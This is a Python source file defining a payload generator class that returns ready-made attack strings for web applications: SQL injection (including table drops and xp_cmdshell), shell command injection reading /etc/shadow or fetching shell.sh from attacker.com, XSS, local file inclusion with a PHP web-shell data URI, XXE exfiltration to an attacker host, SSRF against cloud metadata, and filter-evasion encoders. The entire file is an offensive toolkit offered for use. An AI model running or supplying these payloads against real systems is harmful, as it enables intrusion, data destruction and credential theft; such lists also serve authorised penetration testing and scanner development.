#!/usr/bin/env python3
import base64
import urllib.parse
import random
import string

class PayloadGenerator:
    def __init__(self):
        self.encoding_types = ['none', 'url', 'double_url', 'base64', 'hex', 'unicode']
        
    def generate_sqli_payloads(self):
        """Generate advanced SQL injection payloads"""
        base_payloads = [
            # Classic SQLi
            "' OR '1'='1",
            "' OR 1=1--",
            "admin' --",
            "admin' #",
            "' OR '1'='1' /*",
            
            # Union-based
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            
            # Boolean-based blind
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            
            # Time-based blind
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; SELECT SLEEP(5)--",
            
            # Error-based
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND extractvalue(1,concat(0x7e,database()))--",
            "' AND updatexml(1,concat(0x7e,database()),1)--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; EXEC xp_cmdshell('whoami')--",
            
            # Advanced bypass techniques
            "' /**/OR/**/ '1'='1",
            "' %09OR%09 '1'='1",
            "'/*comment*/OR/*comment*/'1'='1",
            "' UnIoN SeLeCt NULL--",
            
            # Filter evasion
            "' /*!50000OR*/ '1'='1",
            "' %0aOR%0a '1'='1",
            "' %0dOR%0d '1'='1",
            "' %0cOR%0c '1'='1",
            
            # Encoding bypass
            "' OR 0x31=0x31--",
            "' OR CHAR(49)=CHAR(49)--",
            
            # Polyglot SQLi
            "' OR '1'='1'/*",
            "1' OR '1'='1'--",
            "1' OR '1'='1'/*",
            "' OR 1=1#",
            "' OR '1'='1'%00",
            
            # Second-order SQLi
            "admin' OR '1'='1'--",
            "' OR username LIKE '%admin%'--",
            
            # XML-based
            "' OR 1=1 AND '<?xml version=\"1.0\"?>",
            
            # JSON-based
            "' OR '1'='1' AND '{\"a\":\"b\"}",
            
            # NoSQL injection
            "' || '1'=='1",
            "' && '1'=='1",
            "{'$gt':''}",
            "{'$ne':null}",
            
            # LDAP injection
            "*)(uid=*))(|(uid=*",
            "admin*)((|userPassword=*)",
            
            # XPath injection
            "' or '1'='1",
            "' or 1=1 or ''='",
            "x' or 1=1 or 'x'='y"
        ]
        
        # Add obfuscated versions
        obfuscated = []
        for payload in base_payloads[:20]:  # Obfuscate first 20
            obfuscated.append(self._obfuscate_sql(payload))
        
        return base_payloads + obfuscated
    
    def generate_rce_payloads(self):
        """Generate advanced RCE payloads"""
        payloads = [
            # Basic command injection
            "; whoami",
            "| whoami",
            "& whoami",
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)",
            
            # With markers for detection
            ";echo RCE_$(whoami)",
            "|echo RCE_`id`",
            "&&echo RCE_test",
            
            # URL encoded
            "%3Bwhoami",
            "%7Cwhoami",
            "%26whoami",
            
            # Double URL encoded
            "%253Bwhoami",
            "%257Cwhoami",
            
            # Newline injection
            "%0awhoami",
            "%0dwhoami",
            "%0d%0awhoami",
            
            # Null byte injection
            ";whoami%00",
            "|whoami%00",
            
            # Backtick variations
            "`id`",
            "`cat /etc/passwd`",
            "`ls -la`",
            
            # Subshell variations
            "$(id)",
            "$(cat /etc/passwd)",
            "$(/usr/bin/id)",
            
            # With path traversal
            ";cat ../../../../etc/passwd",
            "|cat ../../etc/shadow",
            
            # PowerShell (Windows)
            "; powershell -c whoami",
            "| powershell -c Get-Host",
            "&& powershell -enc dwBoAG8AYQBtAGkA",
            
            # Bash specific
            "; bash -c 'whoami'",
            "|/bin/bash -c 'id'",
            
            # Python code execution
            "; python -c 'import os;os.system(\"whoami\")'",
            "|python -c '__import__(\"os\").system(\"id\")'",
            
            # Perl code execution
            "; perl -e 'system(\"whoami\")'",
            
            # PHP code execution
            "; php -r 'system(\"whoami\");'",
            
            # Ruby code execution
            "; ruby -e 'system(\"whoami\")'",
            
            # Node.js code execution
            "; node -e 'require(\"child_process\").exec(\"whoami\")'",
            
            # Shellshock
            "() { :; }; echo vulnerable",
            "() { :; }; /bin/bash -c 'whoami'",
            
            # ImageTragick
            "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://evil.com/shell.jpg \"|whoami\")'\npop graphic-context",
            
            # CRLF injection
            "whoami%0d%0aSet-Cookie:admin=true",
            
            # Filter bypass with wildcards
            "w?oami",
            "who*mi",
            "/b??/cat /etc/passwd",
            
            # Concatenation bypass
            "who'a'mi",
            'who"a"mi',
            "who$@ami",
            
            # Variable expansion
            "w$()hoami",
            "w${}hoami",
            
            # Escaped characters
            "wh\\oami",
            "who\\ami",
            
            # Case manipulation
            "WhOaMi",
            "WHOAMI",
            
            # Time-based detection
            "; sleep 5",
            "| sleep 5",
            "&& ping -c 5 127.0.0.1",
            
            # Out-of-band (OOB)
            "; nslookup attacker.com",
            "| curl http://attacker.com",
            "&& wget http://attacker.com/shell.sh"
        ]
        
        return payloads
    
    def generate_xss_payloads(self):
        """Generate advanced XSS payloads"""
        payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            
            # Polyglot XSS
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
            
            # Filter bypass
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<IMG SRC=javascript:alert('XSS')>",
            "<IMG SRC=JaVaScRiPt:alert('XSS')>",
            
            # Event handlers
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<keygen onfocus=alert(1) autofocus>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            
            # Encoded payloads
            "<script>\\u0061lert(1)</script>",
            "<script>\\x61lert(1)</script>",
            "<script>eval('\\x61lert(1)')</script>",
            
            # DOM-based
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
            "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
            
            # Markdown XSS
            "[Click me](javascript:alert(1))",
            "![](javascript:alert(1))",
            
            # CSS injection
            "<style>*{background:url('javascript:alert(1)')}</style>",
            
            # Using different tags
            "<iframe src=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            "<object data=javascript:alert(1)>",
            
            # Data URI
            "<script src=data:text/javascript,alert(1)>",
            
            # Breaking out of attributes
            "' onmouseover='alert(1)",
            "\" onmouseover=\"alert(1)",
            
            # Template injection (AngularJS)
            "{{constructor.constructor('alert(1)')()}}",
            "{{$on.constructor('alert(1)')()}}",
            
            # VueJS
            "{{_c.constructor('alert(1)')()}}",
            
            # React
            "javascript:alert(1)",
            
            # Mutation XSS
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
            
            # Using comments
            "<!--<img src=x onerror=alert(1)>-->",
            
            # WAF bypass
            "<script>alert(1)//",
            "<script>alert(1)<!--",
            "<script>alert(1)%0A",
            "<script>alert(1)%0D"
        ]
        
        return payloads
    
    def generate_lfi_payloads(self):
        """Generate advanced LFI payloads"""
        payloads = [
            # Basic traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            
            # Deep traversal
            "../" * 10 + "etc/passwd",
            "..\\" * 10 + "windows\\win.ini",
            
            # URL encoded
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5C..%5C..%5Cwindows%5Cwin.ini",
            
            # Double encoded
            "..%252F..%252F..%252Fetc%252Fpasswd",
            
            # Unicode
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            
            # Overlong UTF-8
            "..%c0%ae%c0%ae/..%c0%ae%c0%ae/etc/passwd",
            
            # Null byte injection
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=../config.php",
            "php://input",
            "php://filter/resource=/etc/passwd",
            "expect://whoami",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
            
            # Zip wrapper
            "zip://archive.zip#shell.php",
            
            # Phar wrapper
            "phar://archive.phar/shell.php",
            
            # Log poisoning
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log",
            "../../../../../../var/log/apache2/access.log",
            
            # Proc filesystem
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/stat",
            "/proc/self/status",
            "/proc/self/fd/0",
            "/proc/version",
            
            # Common files
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/hostname",
            "/etc/issue",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\boot.ini",
            
            # Bypass with dots
            "....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\win.ini",
            
            # Bypass with encoding mix
            "..%2F..%2F..%2F..%5C..%5C..%5Cetc/passwd"
        ]
        
        return payloads
    
    def generate_xxe_payloads(self):
        """Generate XXE payloads"""
        payloads = [
            # Basic XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            
            # Blind XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo></foo>',
            
            # XXE with parameter entities
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]><foo></foo>',
            
            # SOAP XXE
            '<soap:Body><foo><![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>]]></foo></soap:Body>',
            
            # SVG XXE
            '<svg xmlns:svg="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><script><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo></script></svg>'
        ]
        
        return payloads
    
    def generate_ssrf_payloads(self):
        """Generate SSRF payloads"""
        payloads = [
            # Basic SSRF
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://0.0.0.0",
            
            # Bypass localhost filters
            "http://127.1",
            "http://127.0.1",
            "http://2130706433",  # Decimal IP
            "http://0x7f000001",  # Hex IP
            "http://017700000001",  # Octal IP
            "http://localhost.localdomain",
            
            # Cloud metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/v1/",
            
            # Internal network
            "http://192.168.0.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            
            # DNS rebinding
            "http://spoofed.burpcollaborator.net",
            
            # Protocol smuggling
            "file:///etc/passwd",
            "dict://localhost:11211/stats",
            "gopher://localhost:6379/_INFO"
        ]
        
        return payloads
    
    def _obfuscate_sql(self, payload):
        """Obfuscate SQL payload"""
        techniques = [
            lambda p: p.replace(' ', '/**/'),
            lambda p: p.replace(' ', '%09'),
            lambda p: p.replace(' ', '%0a'),
            lambda p: ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in p),
            lambda p: p.replace('OR', '/*!50000OR*/'),
            lambda p: p.replace('AND', '/*!50000AND*/'),
        ]
        
        technique = random.choice(techniques)
        return technique(payload)
    
    def encode_payload(self, payload, encoding_type='url'):
        """Encode payload using various techniques"""
        if encoding_type == 'url':
            return urllib.parse.quote(payload)
        elif encoding_type == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding_type == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding_type == 'hex':
            return ''.join(hex(ord(c))[2:] for c in payload)
        elif encoding_type == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        else:
            return payload
    
    def generate_polyglot_payload(self):
        """Generate polyglot payload that works across multiple contexts"""
        polyglots = [
            # SQL + XSS
            "' OR '1'='1' <script>alert(1)</script>",
            
            # Command injection + SQL
            "'; whoami-- ",
            
            # Universal polyglot
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e",
            
            # Multi-context
            "'><script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            
            # Template injection + XSS
            "{{7*7}}<script>alert(1)</script>"
        ]
        
        return random.choice(polyglots)
    
    def generate_mutation_payload(self, base_payload):
        """Generate mutated version of payload for bypassing filters"""
        mutations = []
        
        # Case variation
        mutations.append(''.join(c.upper() if random.random() > 0.5 else c.lower() for c in base_payload))
        
        # Add comments
        if 'SELECT' in base_payload.upper():
            mutations.append(base_payload.replace(' ', '/**/'))
        
        # URL encoding
        mutations.append(urllib.parse.quote(base_payload))
        
        # Add null bytes
        mutations.append(base_payload + '%00')
        
        # Concatenation
        if "'" in base_payload:
            mutations.append(base_payload.replace("'", "'++'"))
        
        return mutations
